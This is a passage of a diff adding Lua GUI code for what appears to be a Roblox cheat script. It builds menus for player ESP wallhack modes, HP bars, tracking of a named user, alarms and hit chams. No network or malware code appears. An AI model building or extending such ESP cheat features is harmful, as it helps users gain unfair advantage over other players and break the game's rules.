+        main.MouseButton1Click:Connect(function() 
+            isPlayerEspEnabled = not isPlayerEspEnabled
+            activeButtonStates[main] = isPlayerEspEnabled
+            updMain()
+            updatePlayerEsp() 
+        end)
+
+        local arr = Instance.new("TextButton", top); arr.Size=UDim2.new(0.2,0,1,0); arr.Position=UDim2.new(0.8,0,0,0); arr.BackgroundColor3=Color3.fromRGB(35,35,35); arr.Text="v"; arr.TextColor3=Color3.new(1,1,1); arr.Font=Enum.Font.GothamBold; arr.TextSize=14; arr.AutoButtonColor=false
+        arr.BackgroundTransparency = 0.6
+        Instance.new("UICorner",arr).CornerRadius=UDim.new(0,12)
+        
+        local drop = Instance.new("Frame", c); drop.Size=UDim2.new(1,0,0,75); drop.Position=UDim2.new(0,0,0,36); drop.BackgroundTransparency=1
+        local layout = Instance.new("UIListLayout", drop); layout.Padding = UDim.new(0, 5)
+        local function modeBtn(name, modeKey)
+            local b = Instance.new("TextButton", drop); b.Size=UDim2.new(1,0,0,30); b.Text=name; b.Font=Enum.Font.Gotham; b.TextSize=12; Instance.new("UICorner",b).CornerRadius=UDim.new(0,8)
+            b.BackgroundTransparency = 0.6
+
+            local function updMode()
+                if currentEspMode == modeKey then
+                    b.BackgroundColor3 = currentThemeColor
+                    b.BackgroundTransparency = 0.3
+                    b.TextColor3 = Color3.new(0,0,0)
+                else
+                    b.BackgroundColor3 = Color3.fromRGB(35,35,35)
+                    b.BackgroundTransparency = 0.6
+                    b.TextColor3 = Color3.new(1,1,1)
+                end
+            end
+            
+            task.spawn(function()
+                while b.Parent do
+                    updMode()
+                    task.wait(0.2)
+                end
+            end)
+
+            b.MouseButton1Click:Connect(function()
+                -- Clear ALL esp artifacts before switching
+                espFolderPlayers:ClearAllChildren()
+                for _, p in pairs(game.Players:GetPlayers()) do
+                    if p.Character then
+                        local oldHl = p.Character:FindFirstChild("Abaddon_EspHighlight")
+                        if oldHl then oldHl:Destroy() end
+                    end
+                end
+                currentEspMode = modeKey
+                updMode()
+                updatePlayerEsp()
+            end)
+        end
+        
+        modeBtn("Mode: Box (Stable)", "Box")
+        modeBtn("Mode: Outline (Glow)", "Outline")
+        modeBtn("Mode: Label (Billboard)", "Label")
+        modeBtn("Mode: Label2 (Box 2D)", "Label2")
+        modeBtn("Mode: Point (Diamond)", "Point")
+
+        -- ESP HP toggle
+        local hpBtn = Instance.new("TextButton", drop)
+        hpBtn.Size = UDim2.new(1, 0, 0, 28)
+        hpBtn.Font = Enum.Font.Gotham; hpBtn.TextSize = 13
+        hpBtn.AutoButtonColor = false; hpBtn.BorderSizePixel = 0
+        Instance.new("UICorner", hpBtn).CornerRadius = UDim.new(0, 8)
+        hpBtn.Text = "HP Bar"
+        local function updateHpBtn()
+            hpBtn.BackgroundColor3 = isEspHpEnabled and currentThemeColor or Color3.fromRGB(40,40,40)
+            hpBtn.BackgroundTransparency = isEspHpEnabled and 0.3 or 0.6
+            hpBtn.TextColor3 = isEspHpEnabled and Color3.new(0,0,0) or Color3.new(1,1,1)
+            activeButtonStates[hpBtn] = isEspHpEnabled
+        end
+        activeButtonStates[hpBtn] = isEspHpEnabled
+        updateHpBtn()
+        buttonSyncFns["espHp"] = function(st) isEspHpEnabled = st; updateHpBtn() end
+        hpBtn.MouseButton1Click:Connect(function()
+            isEspHpEnabled = not isEspHpEnabled
+            if not isEspHpEnabled then
+                -- Hide HpSection on all existing BB billboards
+                for _, obj in pairs(espFolderPlayers:GetChildren()) do
+                    if obj.Name:sub(-3) == "_BB" then
+                        local hs = obj:FindFirstChild("HpSection")
+                        if hs then hs.Visible = false end
+                    end
+                end
+            end
+            updateHpBtn()
+        end)
+
+        -- Keybind row
+        local kbFrame = Instance.new("Frame", drop)
+        kbFrame.Size = UDim2.new(1, 0, 0, 30)
+        kbFrame.BackgroundTransparency = 1
+
+        local kbLabel = Instance.new("TextLabel", kbFrame)
+        kbLabel.Size = UDim2.new(0.55, 0, 1, 0)
+        kbLabel.BackgroundTransparency = 1
+        kbLabel.Text = "ESP Keybind:"
+        kbLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+        kbLabel.Font = Enum.Font.Gotham
+        kbLabel.TextSize = 12
+        kbLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+        local kbBtn = Instance.new("TextButton", kbFrame)
+        kbBtn.Size = UDim2.new(0.43, 0, 0.8, 0)
+        kbBtn.Position = UDim2.new(0.57, 0, 0.1, 0)
+        kbBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        kbBtn.BackgroundTransparency = 0.4
+        kbBtn.Font = Enum.Font.GothamBold
+        kbBtn.TextSize = 11
+        kbBtn.TextColor3 = Color3.new(1, 1, 1)
+        kbBtn.AutoButtonColor = false
+        Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 6)
+
+        local function refreshKbText()
+            kbBtn.Text = playerEspKeybind == Enum.KeyCode.Unknown and "[None]" or playerEspKeybind.Name
+        end
+        sliderSyncFns["espBind"] = function() refreshKbText() end
+        refreshKbText()
+
+        local settingKb = false
+        kbBtn.MouseButton1Click:Connect(function()
+            if settingKb then return end
+            settingKb = true
+            kbBtn.Text = "..."
+            local conn; conn = UIS.InputBegan:Connect(function(inp, gpe)
+                if inp.UserInputType == Enum.UserInputType.Keyboard then
+                    if inp.KeyCode == Enum.KeyCode.Backspace or inp.KeyCode == Enum.KeyCode.Delete then
+                        playerEspKeybind = Enum.KeyCode.Unknown
+                    else
+                        playerEspKeybind = inp.KeyCode
+                    end
+                    settingKb = false
+                    refreshKbText()
+                    conn:Disconnect()
+                end
+            end)
+        end)
+
+        local exp = false
+        arr.MouseButton1Click:Connect(function()
+            exp = not exp
+            arr.Text = exp and "^" or "v"
+            TS:Create(c, TweenInfo.new(0.3), {Size = exp and UDim2.new(1,0,0,310) or UDim2.new(1,0,0,32)}):Play()
+        end)
+    end
+    local function createFriendHpSection()
+        local c = Instance.new("Frame", s); c.Name="FriendHpContainer"; c.Size=UDim2.new(1,0,0,32); c.BackgroundTransparency=1; c.ClipsDescendants=true
+        local top = Instance.new("Frame", c); top.Size=UDim2.new(1,0,0,32); top.BackgroundTransparency=1
+        
+        local main = Instance.new("TextButton", top); main.Size=UDim2.new(0.8,-4,1,0); main.Text="Friend HP HUD"; main.Font=Enum.Font.Gotham; main.TextSize=14; main.AutoButtonColor=false
+        main.BackgroundTransparency = 0.6
+        Instance.new("UICorner",main).CornerRadius=UDim.new(0,12)
+        
+        activeButtonStates[main] = isFriendHpVisible
+        buttonSyncFns["friendHp"] = function(st)
+            activeButtonStates[main] = st
+            main.BackgroundColor3 = st and currentThemeColor or Color3.fromRGB(40,40,40)
+            main.BackgroundTransparency = st and 0.3 or 0.6
+            main.TextColor3 = st and Color3.new(0,0,0) or Color3.new(1,1,1)
+            -- visual only; setState calls toggleFriendHp directly
+        end
+        local function updMain()
+            main.BackgroundColor3 = isFriendHpVisible and currentThemeColor or Color3.fromRGB(40,40,40)
+            main.BackgroundTransparency = isFriendHpVisible and 0.3 or 0.6
+            main.TextColor3 = isFriendHpVisible and Color3.new(0,0,0) or Color3.new(1,1,1)
+        end
+        updMain()
+        main.MouseButton1Click:Connect(function() 
+            isFriendHpVisible = not isFriendHpVisible
+            activeButtonStates[main] = isFriendHpVisible
+            updMain()
+            toggleFriendHp(isFriendHpVisible)
+        end)
+
+        local arr = Instance.new("TextButton", top); arr.Size=UDim2.new(0.2,0,1,0); arr.Position=UDim2.new(0.8,0,0,0); arr.BackgroundColor3=Color3.fromRGB(35,35,35); arr.Text="v"; arr.TextColor3=Color3.new(1,1,1); arr.Font=Enum.Font.GothamBold; arr.TextSize=14; arr.AutoButtonColor=false
+        arr.BackgroundTransparency = 0.6
+        Instance.new("UICorner",arr).CornerRadius=UDim.new(0,12)
+        
+        local drop = Instance.new("Frame", c); drop.Size=UDim2.new(1,0,0,75); drop.Position=UDim2.new(0,0,0,36); drop.BackgroundTransparency=1
+        local nb = Instance.new("TextBox", drop); nb.Size=UDim2.new(1,0,0,30); nb.BackgroundColor3=Color3.fromRGB(30,30,30); nb.Text=friendTargetNames[1]; nb.PlaceholderText="Friend Name..."; nb.TextColor3=Color3.new(1,1,1); nb.Font=Enum.Font.Gotham; nb.TextSize=14; Instance.new("UICorner",nb).CornerRadius=UDim.new(0,8)
+        nb.BackgroundTransparency = 0.6
+        nb.FocusLost:Connect(function() friendTargetNames[1]=nb.Text end)
+        sliderSyncFns["friendNick1"] = function() nb.Text = friendTargetNames[1] or "" end
+        local bb = Instance.new("TextButton", drop); bb.Size=UDim2.new(1,0,0,30); bb.Position=UDim2.new(0,0,0,35); bb.BackgroundColor3=Color3.fromRGB(30,30,30); bb.Text=(friendHpKeybind == Enum.KeyCode.Unknown) and "Bind: Not set" or ("Bind: "..friendHpKeybind.Name); sliderSyncFns["friendBind"] = function() bb.Text=(friendHpKeybind==Enum.KeyCode.Unknown) and "Bind: Not set" or ("Bind: "..friendHpKeybind.Name) end; bb.TextColor3=Color3.new(1,1,1); bb.Font=Enum.Font.Gotham; bb.TextSize=14; Instance.new("UICorner",bb).CornerRadius=UDim.new(0,8)
+        bb.BackgroundTransparency = 0.6
+        bb.MouseButton1Click:Connect(function() bb.Text="..." local i=UIS.InputBegan:Wait(); if i.KeyCode.Name~="Unknown" then friendHpKeybind=i.KeyCode; bb.Text="Bind: "..i.KeyCode.Name end end)
+
+        local exp = false
+        arr.MouseButton1Click:Connect(function()
+            exp = not exp
+            arr.Text = exp and "^" or "v"
+            TS:Create(c, TweenInfo.new(0.3), {Size = exp and UDim2.new(1,0,0,115) or UDim2.new(1,0,0,32)}):Play()
+        end)
+    end
+    
+    -- Milo ESP Section
+    local function createMiloEspSection()
+        local c = Instance.new("Frame", s); c.Name="MiloEspContainer"; c.Size=UDim2.new(1,0,0,32); c.BackgroundTransparency=1; c.ClipsDescendants=true
+        local top = Instance.new("Frame", c); top.Size=UDim2.new(1,0,0,32); top.BackgroundTransparency=1
+        
+        local main = Instance.new("TextButton", top); main.Size=UDim2.new(0.8,-4,1,0); main.Text="Milo ESP"; main.Font=Enum.Font.Gotham; main.TextSize=14; main.AutoButtonColor=false
+        main.BackgroundTransparency = 0.6
+        Instance.new("UICorner",main).CornerRadius=UDim.new(0,12)
+        
+        activeButtonStates[main] = isTargetEspEnabled
+        local function updMain()
+            main.BackgroundColor3 = isTargetEspEnabled and currentThemeColor or Color3.fromRGB(40,40,40)
+            main.BackgroundTransparency = isTargetEspEnabled and 0.3 or 0.6
+            main.TextColor3 = isTargetEspEnabled and Color3.new(0,0,0) or Color3.new(1,1,1)
+        end
+        updMain()
+        
+        main.MouseButton1Click:Connect(function() 
+            isTargetEspEnabled = not isTargetEspEnabled
+            activeButtonStates[main] = isTargetEspEnabled
+            updMain()
+        end)
+
+        local arr = Instance.new("TextButton", top); arr.Size=UDim2.new(0.2,0,1,0); arr.Position=UDim2.new(0.8,0,0,0); arr.BackgroundColor3=Color3.fromRGB(35,35,35); arr.Text="v"; arr.TextColor3=Color3.new(1,1,1); arr.Font=Enum.Font.GothamBold; arr.TextSize=14; arr.AutoButtonColor=false
+        arr.BackgroundTransparency = 0.6
+        Instance.new("UICorner",arr).CornerRadius=UDim.new(0,12)
+        
+        local drop = Instance.new("Frame", c); drop.Size=UDim2.new(1,0,0,40); drop.Position=UDim2.new(0,0,0,36); drop.BackgroundTransparency=1
+        
+        local inp = Instance.new("TextBox", drop); inp.Size=UDim2.new(1,0,0,30); inp.BackgroundColor3=Color3.fromRGB(30,30,30); inp.Text=targetEspName; inp.PlaceholderText="Input Username"; inp.TextColor3=Color3.new(1,1,1); inp.Font=Enum.Font.Gotham; inp.TextSize=14; Instance.new("UICorner",inp).CornerRadius=UDim.new(0,8)
+        inp.BackgroundTransparency = 0.6
+        inp:GetPropertyChangedSignal("Text"):Connect(function()
+            targetEspName = inp.Text 
+        end)
+
+        local exp = false
+        arr.MouseButton1Click:Connect(function()
+            exp = not exp
+            arr.Text = exp and "^" or "v"
+            TS:Create(c, TweenInfo.new(0.3), {Size = exp and UDim2.new(1,0,0,75) or UDim2.new(1,0,0,32)}):Play()
+        end)
+    end
+
+    -- Bed Alarm Section
+    local function createBedAlarmSection()
+        local c = Instance.new("Frame", s); c.Name="BedAlarmContainer"; c.Size=UDim2.new(1,0,0,32); c.BackgroundTransparency=1; c.ClipsDescendants=true
+        local top = Instance.new("Frame", c); top.Size=UDim2.new(1,0,0,32); top.BackgroundTransparency=1
+        
+        local main = Instance.new("TextButton", top); main.Size=UDim2.new(0.8,-4,1,0); main.Text="Bed Alarm"; main.Font=Enum.Font.Gotham; main.TextSize=14; main.AutoButtonColor=false
+        main.BackgroundTransparency = 0.6
+        Instance.new("UICorner",main).CornerRadius=UDim.new(0,12)
+        
+        activeButtonStates[main] = isBedAlarmEnabled
+        buttonSyncFns["bedAlarm"] = function(st) activeButtonStates[main]=st; main.BackgroundColor3=st and currentThemeColor or Color3.fromRGB(40,40,40); main.BackgroundTransparency=st and 0.3 or 0.6; main.TextColor3=st and Color3.new(0,0,0) or Color3.new(1,1,1) end
+        local function updMain()
+            main.BackgroundColor3 = isBedAlarmEnabled and currentThemeColor or Color3.fromRGB(40,40,40)
+            main.BackgroundTransparency = isBedAlarmEnabled and 0.3 or 0.6
+            main.TextColor3 = isBedAlarmEnabled and Color3.new(0,0,0) or Color3.new(1,1,1)
+        end
+        updMain()
+        
+        main.MouseButton1Click:Connect(function() 
+            isBedAlarmEnabled = not isBedAlarmEnabled
+            activeButtonStates[main] = isBedAlarmEnabled
+            if isBedAlarmEnabled and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                bedAlarmPos = player.Character.HumanoidRootPart.Position
+                updateBedAlarmVisual()
+            else
+                updateBedAlarmVisual()
+            end
+            updMain()
+        end)
+
+        local arr = Instance.new("TextButton", top); arr.Size=UDim2.new(0.2,0,1,0); arr.Position=UDim2.new(0.8,0,0,0); arr.BackgroundColor3=Color3.fromRGB(35,35,35); arr.Text="v"; arr.TextColor3=Color3.new(1,1,1); arr.Font=Enum.Font.GothamBold; arr.TextSize=14; arr.AutoButtonColor=false
+        arr.BackgroundTransparency = 0.6
+        Instance.new("UICorner",arr).CornerRadius=UDim.new(0,12)
+        
+        local drop = Instance.new("Frame", c); drop.Size=UDim2.new(1,0,0,115); drop.Position=UDim2.new(0,0,0,36); drop.BackgroundTransparency=1
+        
+        local sliderFrame = Instance.new("Frame", drop)
+        sliderFrame.Size = UDim2.new(1, 0, 0, 30)
+        sliderFrame.BackgroundTransparency = 1
+        
+        local slidLabel = Instance.new("TextLabel", sliderFrame)
+        slidLabel.Text = "Radius: " .. bedAlarmRadius
+        slidLabel.Size = UDim2.new(1, 0, 0, 15)
+        slidLabel.BackgroundTransparency = 1
+        slidLabel.TextColor3 = Color3.new(1,1,1)
+        slidLabel.Font = Enum.Font.GothamBold
+        slidLabel.TextSize = 10
+        slidLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+        local slidBg = Instance.new("TextButton", sliderFrame)
+        slidBg.Size = UDim2.new(1, 0, 0, 10)
+        slidBg.Position = UDim2.new(0, 0, 0, 18)
+        slidBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        slidBg.AutoButtonColor = false
+        slidBg.Text = ""
+        slidBg.BackgroundTransparency = 0.5
+        Instance.new("UICorner", slidBg).CornerRadius = UDim.new(1, 0)
+
+        local slidFill = Instance.new("Frame", slidBg)
+        slidFill.Name = "SliderFill"
+        slidFill.Size = UDim2.new(bedAlarmRadius/100, 0, 1, 0)
+        sliderSyncFns["bedAlarmRadius"] = function(v) bedAlarmRadius=v; slidFill.Size=UDim2.new(v/100,0,1,0); slidLabel.Text="Radius: "..v end
+        slidFill.BackgroundColor3 = currentThemeColor
+        slidFill.BorderSizePixel = 0
+        slidFill.BackgroundTransparency = 0.2
+        Instance.new("UICorner", slidFill).CornerRadius = UDim.new(1, 0)
+
+        local dragging = false
+        slidBg.InputBegan:Connect(function(input) 
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true end 
+        end)
+        slidBg.InputEnded:Connect(function(input) 
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end 
+        end)
+        UIS.InputChanged:Connect(function(input)
+            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+                local relativeX = math.clamp((input.Position.X - slidBg.AbsolutePosition.X) / slidBg.AbsoluteSize.X, 0, 1)
+                local val = math.floor(relativeX * 99) + 1 
+                bedAlarmRadius = val
+                slidFill.Size = UDim2.new(relativeX, 0, 1, 0)
+                slidLabel.Text = "Radius: " .. val
+                updateBedAlarmVisual()
+            end
+        end)
+
+        -- Volume slider
+        local volFrame = Instance.new("Frame", drop)
+        volFrame.Size = UDim2.new(1, 0, 0, 30)
+        volFrame.Position = UDim2.new(0, 0, 0, 35)
+        volFrame.BackgroundTransparency = 1
+        local volLbl = Instance.new("TextLabel", volFrame)
+        volLbl.Text = "Volume: "..math.floor(bedAlarmVolume*100)
+        volLbl.Size = UDim2.new(1, 0, 0, 15)
+        volLbl.BackgroundTransparency = 1
+        volLbl.TextColor3 = Color3.new(1,1,1)
+        volLbl.Font = Enum.Font.GothamBold
+        volLbl.TextSize = 10
+        volLbl.TextXAlignment = Enum.TextXAlignment.Left
+        local volBg = Instance.new("TextButton", volFrame)
+        volBg.Size = UDim2.new(1, 0, 0, 10)
+        volBg.Position = UDim2.new(0, 0, 0, 18)
+        volBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        volBg.AutoButtonColor = false; volBg.Text = ""; volBg.BackgroundTransparency = 0.5
+        Instance.new("UICorner", volBg).CornerRadius = UDim.new(1, 0)
+        local volFill = Instance.new("Frame", volBg)
+        volFill.Name = "SliderFill"
+        volFill.Size = UDim2.new(bedAlarmVolume, 0, 1, 0)
+        volFill.BackgroundColor3 = currentThemeColor; volFill.BorderSizePixel = 0; volFill.BackgroundTransparency = 0.2
+        sliderSyncFns["bedAlarmVolume"] = function(v) bedAlarmVolume=v; volFill.Size=UDim2.new(v,0,1,0); volLbl.Text="Volume: "..math.floor(v*100) end
+        Instance.new("UICorner", volFill).CornerRadius = UDim.new(1, 0)
+        local volDrag = false
+        volBg.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then volDrag = true end end)
+        volBg.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then volDrag = false end end)
+        UIS.InputChanged:Connect(function(i)
+            if volDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
+                local rx = math.clamp((i.Position.X - volBg.AbsolutePosition.X) / volBg.AbsoluteSize.X, 0, 1)
+                bedAlarmVolume = rx
+                if bedAlarmSound then bedAlarmSound.Volume = rx end
+                volFill.Size = UDim2.new(rx, 0, 1, 0)
+                volLbl.Text = "Volume: " .. math.floor(rx * 100)
+            end
+        end)
+
+        local setPosBtn = Instance.new("TextButton", drop); setPosBtn.Size=UDim2.new(1,0,0,30); setPosBtn.Position=UDim2.new(0,0,0,75); setPosBtn.BackgroundColor3=Color3.fromRGB(30,30,30); setPosBtn.Text="Set Pos Here"; setPosBtn.TextColor3=Color3.new(1,1,1); setPosBtn.Font=Enum.Font.Gotham; setPosBtn.TextSize=14; Instance.new("UICorner",setPosBtn).CornerRadius=UDim.new(0,8)
+        setPosBtn.BackgroundTransparency = 0.6
+        setPosBtn.MouseButton1Click:Connect(function()
+             if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                bedAlarmPos = player.Character.HumanoidRootPart.Position
+                updateBedAlarmVisual()
+             end
+        end)
+
+        local exp = false
+        arr.MouseButton1Click:Connect(function()
+            exp = not exp
+            arr.Text = exp and "^" or "v"
+            TS:Create(c, TweenInfo.new(0.3), {Size = exp and UDim2.new(1,0,0,155) or UDim2.new(1,0,0,32)}):Play()
+        end)
+    end
+
+    -- Panic Circle Section
+    local function createPanicCircleSection()
+        local c = Instance.new("Frame", s); c.Name="PanicCircleContainer"; c.Size=UDim2.new(1,0,0,32); c.BackgroundTransparency=1; c.ClipsDescendants=true
+        local top = Instance.new("Frame", c); top.Size=UDim2.new(1,0,0,32); top.BackgroundTransparency=1
+        
+        local main = Instance.new("TextButton", top); main.Size=UDim2.new(0.8,-4,1,0); main.Text="Panic Circle"; main.Font=Enum.Font.Gotham; main.TextSize=14; main.AutoButtonColor=false
+        main.BackgroundTransparency = 0.6
+        Instance.new("UICorner",main).CornerRadius=UDim.new(0,12)
+        
+        activeButtonStates[main] = isPanicCircleEnabled
+        buttonSyncFns["panicCircle"] = function(st) activeButtonStates[main]=st; main.BackgroundColor3=st and currentThemeColor or Color3.fromRGB(40,40,40); main.BackgroundTransparency=st and 0.3 or 0.6; main.TextColor3=st and Color3.new(0,0,0) or Color3.new(1,1,1) end
+        local function updMain()
+            main.BackgroundColor3 = isPanicCircleEnabled and currentThemeColor or Color3.fromRGB(40,40,40)
+            main.BackgroundTransparency = isPanicCircleEnabled and 0.3 or 0.6
+            main.TextColor3 = isPanicCircleEnabled and Color3.new(0,0,0) or Color3.new(1,1,1)
+        end
+        updMain()
+        
+        main.MouseButton1Click:Connect(function() 
+            isPanicCircleEnabled = not isPanicCircleEnabled
+            activeButtonStates[main] = isPanicCircleEnabled
+            updatePanicCircleVisual()
+            updMain()
+        end)
+
+        local arr = Instance.new("TextButton", top); arr.Size=UDim2.new(0.2,0,1,0); arr.Position=UDim2.new(0.8,0,0,0); arr.BackgroundColor3=Color3.fromRGB(35,35,35); arr.Text="v"; arr.TextColor3=Color3.new(1,1,1); arr.Font=Enum.Font.GothamBold; arr.TextSize=14; arr.AutoButtonColor=false
+        arr.BackgroundTransparency = 0.6
+        Instance.new("UICorner",arr).CornerRadius=UDim.new(0,12)
+        
+        local drop = Instance.new("Frame", c); drop.Size=UDim2.new(1,0,0,75); drop.Position=UDim2.new(0,0,0,36); drop.BackgroundTransparency=1
+        
+        local sliderFrame = Instance.new("Frame", drop)
+        sliderFrame.Size = UDim2.new(1, 0, 0, 30)
+        sliderFrame.BackgroundTransparency = 1
+        
+        local slidLabel = Instance.new("TextLabel", sliderFrame)
+        slidLabel.Text = "Radius: " .. panicCircleRadius
+        slidLabel.Size = UDim2.new(1, 0, 0, 15)
+        slidLabel.BackgroundTransparency = 1
+        slidLabel.TextColor3 = Color3.new(1,1,1)
+        slidLabel.Font = Enum.Font.GothamBold
+        slidLabel.TextSize = 10
+        slidLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+        local slidBg = Instance.new("TextButton", sliderFrame)
+        slidBg.Size = UDim2.new(1, 0, 0, 10)
+        slidBg.Position = UDim2.new(0, 0, 0, 18)
+        slidBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        slidBg.AutoButtonColor = false
+        slidBg.Text = ""
+        slidBg.BackgroundTransparency = 0.5
+        Instance.new("UICorner", slidBg).CornerRadius = UDim.new(1, 0)
+
+        local slidFill = Instance.new("Frame", slidBg)
+        slidFill.Name = "SliderFill"
+        slidFill.Size = UDim2.new(panicCircleRadius/100, 0, 1, 0)
+        sliderSyncFns["panicRadius"] = function(v) panicCircleRadius=v; slidFill.Size=UDim2.new(v/100,0,1,0); slidLabel.Text="Radius: "..v end
+        slidFill.BackgroundColor3 = currentThemeColor
+        slidFill.BorderSizePixel = 0
+        slidFill.BackgroundTransparency = 0.2
+        Instance.new("UICorner", slidFill).CornerRadius = UDim.new(1, 0)
+
+        local dragging = false
+        slidBg.InputBegan:Connect(function(input) 
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true end 
+        end)
+        slidBg.InputEnded:Connect(function(input) 
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end 
+        end)
+        UIS.InputChanged:Connect(function(input)
+            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+                local relativeX = math.clamp((input.Position.X - slidBg.AbsolutePosition.X) / slidBg.AbsoluteSize.X, 0, 1)
+                local val = math.floor(relativeX * 99) + 1 
+                panicCircleRadius = val
+                slidFill.Size = UDim2.new(relativeX, 0, 1, 0)
+                slidLabel.Text = "Radius: " .. val
+                updatePanicCircleVisual()
+            end
+        end)
+
+        -- Volume slider
+        local volFrame2 = Instance.new("Frame", drop)
+        volFrame2.Size = UDim2.new(1, 0, 0, 30)
+        volFrame2.Position = UDim2.new(0, 0, 0, 35)
+        volFrame2.BackgroundTransparency = 1
+        local volLbl2 = Instance.new("TextLabel", volFrame2)
+        volLbl2.Text = "Volume: "..math.floor(panicCircleVolume*100)
+        volLbl2.Size = UDim2.new(1, 0, 0, 15)
+        volLbl2.BackgroundTransparency = 1
+        volLbl2.TextColor3 = Color3.new(1,1,1)
+        volLbl2.Font = Enum.Font.GothamBold
+        volLbl2.TextSize = 10
+        volLbl2.TextXAlignment = Enum.TextXAlignment.Left
+        local volBg2 = Instance.new("TextButton", volFrame2)
+        volBg2.Size = UDim2.new(1, 0, 0, 10)
+        volBg2.Position = UDim2.new(0, 0, 0, 18)
+        volBg2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        volBg2.AutoButtonColor = false; volBg2.Text = ""; volBg2.BackgroundTransparency = 0.5
+        Instance.new("UICorner", volBg2).CornerRadius = UDim.new(1, 0)
+        local volFill2 = Instance.new("Frame", volBg2)
+        volFill2.Name = "SliderFill"
+        volFill2.Size = UDim2.new(panicCircleVolume, 0, 1, 0)
+        volFill2.BackgroundColor3 = currentThemeColor; volFill2.BorderSizePixel = 0; volFill2.BackgroundTransparency = 0.2
+        sliderSyncFns["panicVolume"] = function(v) panicCircleVolume=v; volFill2.Size=UDim2.new(v,0,1,0); volLbl2.Text="Volume: "..math.floor(v*100) end
+        Instance.new("UICorner", volFill2).CornerRadius = UDim.new(1, 0)
+        local volDrag2 = false
+        volBg2.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then volDrag2 = true end end)
+        volBg2.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then volDrag2 = false end end)
+        UIS.InputChanged:Connect(function(i)
+            if volDrag2 and i.UserInputType == Enum.UserInputType.MouseMovement then
+                local rx = math.clamp((i.Position.X - volBg2.AbsolutePosition.X) / volBg2.AbsoluteSize.X, 0, 1)
+                panicCircleVolume = rx
+                if panicCircleSound then panicCircleSound.Volume = rx end
+                volFill2.Size = UDim2.new(rx, 0, 1, 0)
+                volLbl2.Text = "Volume: " .. math.floor(rx * 100)
+            end
+        end)
+
+        local exp = false
+        arr.MouseButton1Click:Connect(function()
+            exp = not exp
+            arr.Text = exp and "^" or "v"
+            TS:Create(c, TweenInfo.new(0.3), {Size = exp and UDim2.new(1,0,0,115) or UDim2.new(1,0,0,32)}):Play()
+        end)
+    end
+
+    -- Hit Sound Section
+    local function createHitChamsSection()
+        local sec = Instance.new("Frame", s); sec.Name="HitChamsSection"
+        sec.Size=UDim2.new(1,0,0,32); sec.BackgroundTransparency=1
+        Instance.new("UIListLayout",sec).SortOrder=Enum.SortOrder.LayoutOrder
+
+        local c=Instance.new("Frame",sec); c.Size=UDim2.new(1,0,0,32); c.BackgroundTransparency=1
+        local mainBtn=Instance.new("TextButton",c)
+        mainBtn.Size=UDim2.new(1,-36,1,0); mainBtn.Font=Enum.Font.Gotham; mainBtn.TextSize=14
+        mainBtn.AutoButtonColor=false; mainBtn.BorderSizePixel=0
+        Instance.new("UICorner",mainBtn).CornerRadius=UDim.new(0,12)
+        activeButtonStates[mainBtn]=isHitChamsEnabled
+        local function updHCBtn()
+            mainBtn.Text="Hit Chams"
+            mainBtn.BackgroundColor3=isHitChamsEnabled and currentThemeColor or Color3.fromRGB(40,40,40)
+            mainBtn.BackgroundTransparency=isHitChamsEnabled and 0.3 or 0.6
+            mainBtn.TextColor3=isHitChamsEnabled and Color3.new(0,0,0) or Color3.new(1,1,1)
+            activeButtonStates[mainBtn]=isHitChamsEnabled
+        end
+        updHCBtn()
+        buttonSyncFns["hitChams"]=function(st) toggleHitChams(st); updHCBtn() end
+        mainBtn.MouseButton1Click:Connect(function() toggleHitChams(not isHitChamsEnabled); updHCBtn() end)
+
+        local arr=Instance.new("TextButton",c)
+        arr.Size=UDim2.new(0,30,1,0); arr.Position=UDim2.new(1,-30,0,0)
+        arr.BackgroundColor3=Color3.fromRGB(40,40,40); arr.BackgroundTransparency=0.6
+        arr.Text="v"; arr.Font=Enum.Font.GothamBold; arr.TextSize=13
+        arr.TextColor3=Color3.new(1,1,1); arr.AutoButtonColor=false; arr.BorderSizePixel=0
+        Instance.new("UICorner",arr).CornerRadius=UDim.new(0,12)
+
+        local drop=Instance.new("Frame",sec)
+        drop.Size=UDim2.new(1,0,0,0); drop.BackgroundTransparency=1; drop.ClipsDescendants=true
+        Instance.new("UIListLayout",drop).Padding=UDim.new(0,4)
+
+        -- Color preview square (shows combined R+G+B result)
+        local previewFr=Instance.new("Frame",drop)
+        previewFr.Size=UDim2.new(1,0,0,36); previewFr.BackgroundTransparency=1
+        local previewBox=Instance.new("Frame",previewFr)
+        previewBox.AnchorPoint=Vector2.new(0,0.5)
+        previewBox.Position=UDim2.new(0,0,0.5,0)
+        previewBox.Size=UDim2.new(0,48,0,28)
+        previewBox.BackgroundColor3=Color3.fromRGB(hitChamsR,hitChamsG,hitChamsB)
+        previewBox.BorderSizePixel=0
+        Instance.new("UICorner",previewBox).CornerRadius=UDim.new(0,8)
+        local function updatePreview()
+            previewBox.BackgroundColor3=Color3.fromRGB(hitChamsR,hitChamsG,hitChamsB)
+        end
+
+        -- Colored RGB sliders
+        local sliderDefs = {
+            {lbl="Red",   col=Color3.fromRGB(255,80,80),  get=function() return hitChamsR end, set=function(v) hitChamsR=v end, key="hitChamsR"},
